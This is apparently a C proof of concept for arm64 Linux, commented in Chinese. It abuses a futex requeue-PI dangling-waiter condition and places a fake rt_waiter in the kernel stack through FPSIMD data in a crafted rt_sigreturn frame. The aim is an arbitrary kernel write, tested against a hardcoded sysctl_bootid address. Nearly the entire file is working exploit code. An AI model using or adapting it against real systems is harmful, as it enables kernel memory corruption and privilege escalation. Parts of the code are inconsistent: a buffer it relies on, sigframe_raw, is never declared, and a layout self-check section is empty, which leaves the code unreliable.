/* 验证: rt_sigreturn 的 FPSIMD 数据能否作为 fake rt_waiter overlay.
 * 流程:
 *  1. waiter 线程触发悬垂 pib (REQUEUE EDEADLK)
 *  2. waiter 构造 sigframe (vregs = fake rt_waiter 数据), 主动调 rt_sigreturn
 *  3. sigreturn 跳回死循环 (保持内核栈内容)
 *  4. consumer 打点 sched_setattr → walk 读 fake waiter → 写 sysctl_bootid
 *  5. 读 boot_id 验证
 */
static long sys(long n,long a,long b,long c,long d,long e,long f){
  register long x8 __asm__("x8")=n; register long x0 __asm__("x0")=a;
  register long x1 __asm__("x1")=b; register long x2 __asm__("x2")=c;
  register long x3 __asm__("x3")=d; register long x4 __asm__("x4")=e;
  register long x5 __asm__("x5")=f;
  __asm__ volatile("svc #0":"+r"(x0):"r"(x8),"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5):"memory");
  return x0;
}
#define SYS_write 64
#define SYS_read 63
#define SYS_openat 56
#define SYS_close 57
#define SYS_nanosleep 101
#define SYS_futex 98
#define SYS_clock_gettime 113
#define SYS_gettid 178
#define SYS_rt_sigreturn 139
#define SYS_sched_setattr 274
#define SYS_mkdirat 34
#define SYS_mount 40
#define SYS_clone 220
#define FUTEX_LOCK_PI 6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define CLOCK_MONOTONIC 1
#define AT_FDCWD -100
#define SCHED_OTHER 0
#define SCHED_BATCH 3
#define CLONE_FLAGS 0x50f00

#define KBASE            0xffffffc008000000UL
#define SYSCTL_BOOTID    (KBASE + 0x02ee910dUL)
#define INIT_TASK        (KBASE + 0x02aec240UL)
#define SCRATCH          (KBASE + 0x02e90000UL)

static void puts_(const char*s){long n=0;while(s[n])n++;sys(SYS_write,1,(long)s,n,0,0,0);}
static void putx_(unsigned long v){
  char b[18]; b[0]='0'; b[1]='x';
  for(int i=0;i<16;i++){ int nib=(v>>((15-i)*4))&0xf; b[2+i]= nib<10?('0'+nib):('a'+nib-10); }
  sys(SYS_write,1,(long)b,18,0,0,0);
}
static void nsleep_us(long us){long ts[2]={us/1000000,(us%1000000)*1000};sys(SYS_nanosleep,(long)ts,0,0,0,0,0);}
static void show_bootid(const char*tag){
  char buf[64]; for(int i=0;i<64;i++) buf[i]=0;
  long fd=sys(SYS_openat,AT_FDCWD,(long)"/proc/sys/kernel/random/boot_id",0,0,0,0);
  puts_(tag);
  if(fd<0){ puts_("<err>\n"); return; }
  long n=sys(SYS_read,fd,(long)buf,60,0,0,0);
  sys(SYS_close,fd,0,0,0,0,0);
  if(n>0) sys(SYS_write,1,(long)buf,n,0,0,0);
  puts_("\n");
}
__attribute__((naked)) static long thr_clone(long flags,void*stack,int(*fn)(void*),void*arg){
  __asm__ volatile(
    "mov x9, x2\n" "mov x10, x3\n"
    "mov x2, #0\n" "mov x3, #0\n" "mov x4, #0\n"
    "mov x8, #220\n" "svc #0\n"
    "cbnz x0, 1f\n"
    "mov x0, x10\n" "blr x9\n"
    "mov x8, #93\n" "svc #0\n"
    "1:\n" "ret\n");
}

volatile unsigned int f_wait, f_pi_target, f_pi_chain;
volatile int waiter_ready, owner_started, waiter_waiting, armed, done_;
volatile long waiter_tid;
static char wstack[65536] __attribute__((aligned(16)));
static char ostack[65536] __attribute__((aligned(16)));
static char cstack[65536] __attribute__((aligned(16)));

/* ============ sigframe 构造 (arm64 精确布局) ============
 * 关键: 本内核按 mcontext+0x118 解析 __reserved (无 8 字节对齐填充),
 * 因此 reserved 绝不能声明 aligned(16), 否则编译器把它挪到 +0x120,
 * 内核在 0x118 处只会看到全零 terminator -> 缺 fpsimd_context -> SIGSEGV.
 */
#define FPSIMD_MAGIC 0x46508001U

struct _aarch64_ctx_ {
  unsigned int magic;
  unsigned int size;
};

struct fpsimd_context_ {
  struct _aarch64_ctx_ head;   /* magic, size */
  unsigned int fpsr;
  unsigned int fpcr;
  unsigned long long vregs[64];  /* 512B */
};

struct sigcontext_ {
  unsigned long fault_address;                 /* mc+0x000 */
  unsigned long regs[31];                      /* mc+0x008 */
  unsigned long sp;                            /* mc+0x100 */
  unsigned long pc;                            /* mc+0x108 */
  unsigned long pstate;                        /* mc+0x110 */
  unsigned char reserved[4096];                /* mc+0x118 无对齐填充! */
};

struct ucontext_ {
  unsigned long uc_flags;                      /* uc+0x000 */
  unsigned long uc_link;                       /* uc+0x008 */
  unsigned long stack_sp;                      /* uc+0x010 (ss_sp) */
  unsigned int  stack_flags;                   /* uc+0x018 (ss_flags) */
  unsigned int  stack_pad;                     /* uc+0x01c */
  unsigned long stack_size;                    /* uc+0x020 (ss_size) */
  unsigned long sigmask[8];                    /* uc+0x028 128B */
  unsigned char unused[128];                   /* uc+0x0A8 */
  struct sigcontext_ uc_mcontext;              /* uc+0x128 */
};

struct rt_sigframe_ {
  char siginfo[0x80];                          /* frame+0x000 */
  struct ucontext_ uc;                         /* frame+0x080 */
};

/* ---- 布局自检: 编译期锁定所有关键偏移 ---- */

static struct rt_sigframe_ sigframe __attribute__((aligned(16)));
static unsigned long post_sigreturn_pc;
static struct fpsimd_context_ *fpsimd_in_reserved;
volatile int entered_loop;

/* sigreturn 后的专用用户栈 (循环里局部变量落在这里, 不碰其他全局) */
static char lstack[16384] __attribute__((aligned(16)));

/* sigreturn 跳回这里: 先立标志, 再纯寄存器死循环 (不能有 syscall, 否则覆盖内核栈 overlay) */
__attribute__((noinline)) static void after_sigreturn_loop(void){
  entered_loop = 1;
  register volatile unsigned long x __asm__("x19") = 1;
  for(;;){
    __asm__ volatile("add %0, %0, #1" : "+r"(x));
    __asm__ volatile("" : : "r"(x));
  }
}

/* 构造 sigframe: fpsimd_context 放 __reserved[0] 内, vregs 里放 fake rt_waiter */

static void build_sigframe(void){
  /* 全零初始化 */
  for(unsigned i=0;i<sizeof(sigframe_raw);i++) sigframe_raw[i]=0;

  /* 精确字节偏移 (从用户SP=0开始):
   * siginfo:      0x000 - 0x07F  (128B, 不读)
   * uc_flags:     0x080          (8B, 不读)
   * uc_link:      0x088          (8B, 不读)
   * uc_stack:     0x090 - 0x0A7  (24B, 不读)
   * uc_sigmask:   0x0A8 - 0x127  (128B → set_current_blocked)
   * __unused:     0x128 - 0x1A7  (128B)
   * fault_addr:   0x1A8          (8B)
   * regs[31]:     0x1B0 - 0x2A7  (248B)
   * sp:           0x2A8          (8B)
   * pc:           0x2B0          (8B) ← sigreturn跳转目标!
   * pstate:       0x2B8          (8B)
   * __reserved:   0x2C0 - 0x11BF (4096B)
   *   __reserved+0x00: FPSIMD magic = 0x46508001 (u32)
   *   __reserved+0x04: size = 0x210 (u32)
   *   __reserved+0x08: fpsr(u32) fpcr(u32)
   *   __reserved+0x10: vregs[512B] ← fake waiter 数据!
   *   __reserved+0x220: terminator {0,0} (已由全零保证)
   */

  /* 设置 pc → 死循环 */
  unsigned long target_pc = (unsigned long)&after_sigreturn_loop;
  for(int i=0;i<8;i++) sigframe_raw[0x2B0+i] = ((unsigned char*)&target_pc)[i];

  /* 设置 pstate = 0 (EL0t 合法) — 已由全零保证 */

  /* __reserved 起始于 sigframe_raw + 0x2C0 */
  unsigned char *res = sigframe_raw + 0x2C0;

  /* FPSIMD context header */
  unsigned int magic = 0x46508001;
  unsigned int ctxsz = 0x210;
  for(int i=0;i<4;i++) res[i]     = ((unsigned char*)&magic)[i];
  for(int i=0;i<4;i++) res[4+i]   = ((unsigned char*)&ctxsz)[i];
  /* fpsr/fpcr 已零 */

  /* vregs 从 reserved+0x10 开始 (512B): 填 fake rt_waiter */
  unsigned char *v = res + 0x10;
  unsigned long parent = SCRATCH + 0x108;
  unsigned long lockval = SCRATCH;
  unsigned long bootid_va = SYSCTL_BOOTID;
  unsigned long init_task_va = INIT_TASK;

  /* tree_entry: pc@+0, right@+8, left@+16 */
  for(int i=0;i<8;i++) v[0+i]  = ((unsigned char*)&parent)[i];      /* w0: tree.pc = 写值 */
  for(int i=0;i<8;i++) v[8+i]  = 0;                                  /* w1: tree.right */
  for(int i=0;i<8;i++) v[16+i] = ((unsigned char*)&bootid_va)[i];   /* w2: tree.left = 写入目标 */

  /* pi_tree: pc@+24, right@+32, left@+40 */
  for(int i=0;i<8;i++) v[24+i] = ((unsigned char*)&parent)[i];      /* w3: pi.pc */
  for(int i=0;i<8;i++) v[32+i] = 0;                                  /* w4: pi.right */
  for(int i=0;i<8;i++) v[40+i] = ((unsigned char*)&bootid_va)[i];   /* w5: pi.left */

  /* task@+48, lock@+56, prio@+64 */
  for(int i=0;i<8;i++) v[48+i] = ((unsigned char*)&init_task_va)[i]; /* w6: task */
  for(int i=0;i<8;i++) v[56+i] = ((unsigned char*)&lockval)[i];      /* w7: lock */
  unsigned long prio = 3;
  for(int i=0;i<8;i++) v[64+i] = ((unsigned char*)&prio)[i];         /* w8: prio */
}

/* ============ consumer: 打点触发 walk ============ */
struct sched_attr{unsigned int size;unsigned int policy;unsigned long long flags;
  int nice;unsigned int priority;unsigned long long runtime,deadline,period;};
static int consumer_fn(void*a){
  (void)a;
  while(!armed) nsleep_us(1000);
  puts_("CONSUMER_START\n");
  long i=0;
  while(armed){
    struct sched_attr at; char*p=(char*)&at; for(unsigned k=0;k<sizeof(at);k++)p[k]=0;
    at.size=sizeof(at);
    at.policy=(i&1)?SCHED_BATCH:SCHED_OTHER;
    at.nice=(int)(i%19)+1;
    sys(SYS_sched_setattr,waiter_tid,(long)&at,0,0,0,0);
    i++;
    nsleep_us(5000);
  }
  puts_("CONSUMER_DONE\n");
  for(;;) nsleep_us(500000);
}

/* ============ waiter: 触发悬垂 + sigreturn ============ */
static int waiter_fn(void*a){
  (void)a;
  waiter_tid = sys(SYS_gettid,0,0,0,0,0,0);
  puts_("WTID="); putx_((unsigned long)waiter_tid); puts_("\n");
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  waiter_ready=1;
  while(!owner_started) nsleep_us(1000);
  long to[2]; sys(SYS_clock_gettime,CLOCK_MONOTONIC,(long)to,0,0,0,0);
  to[0]+=3;
  waiter_waiting=1;
  sys(SYS_futex,(long)&f_wait,FUTEX_WAIT_REQUEUE_PI,0,(long)to,(long)&f_pi_target,0);
  puts_("W_REQUEUE_RET\n");   /* 悬垂 pib 建立 */
  nsleep_us(200000);          /* 等 main requeue 完成 */
  /* 构造 sigframe 并主动调 rt_sigreturn (SP 指向 sigframe 后裸 svc) */
  build_sigframe();
  puts_("CALL_RT_SIGRETURN\n");
  __asm__ volatile(
    "mov sp, %0\n"
    "mov x8, #139\n"        /* SYS_rt_sigreturn */
    "svc #0\n"
    : : "r"(&sigframe) : "x8", "sp");
  /* 校验失败时内核直接 SIGSEGV 杀进程, 正常到不了这 */
  puts_("SIGRETURN_FAILED\n");
  for(;;) nsleep_us(500000);
}
static int owner_fn(void*a){
  (void)a;
  sys(SYS_futex,(long)&f_pi_target,FUTEX_LOCK_PI,0,0,0,0);
  while(!waiter_ready) nsleep_us(1000);
  owner_started=1;
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  for(;;) nsleep_us(500000);
}

void _start(void){
  puts_("\n=== SIGRETURN-PROBE ===\n");
  sys(SYS_mkdirat,AT_FDCWD,(long)"/proc",0755,0,0,0);
  sys(SYS_mount,(long)"proc",(long)"/proc",(long)"proc",0,0,0);
  show_bootid("BOOTID_BEFORE=");
  thr_clone(CLONE_FLAGS,ostack+sizeof(ostack),owner_fn,0);
  thr_clone(CLONE_FLAGS,wstack+sizeof(wstack),waiter_fn,0);
  thr_clone(CLONE_FLAGS,cstack+sizeof(cstack),consumer_fn,0);
  while(!waiter_waiting || !owner_started) nsleep_us(1000);
  nsleep_us(100000);
  sys(SYS_futex,(long)&f_wait,FUTEX_CMP_REQUEUE_PI,1,1,(long)&f_pi_target,0);
  puts_("REQUEUE_DONE\n");
  nsleep_us(300000);
  armed=1;                       /* consumer 开始打点 */
  /* 轮询 entered_loop: 主线程负责打印, 避免 waiter 在循环内做 syscall 污染 overlay */
  long waited_ms=0;
  while(!entered_loop && waited_ms < 15000){ nsleep_us(1000); waited_ms++; }
  if(entered_loop){
    puts_("SIGRETURN_LOOP\n");
  }else{
    puts_("SIGRETURN_TIMEOUT\n");
  }
  armed=0;
  show_bootid("BOOTID_AFTER=");
  puts_("=== SIGRETURN-PROBE-DONE ===\n");
  for(;;) nsleep_us(500000);
}
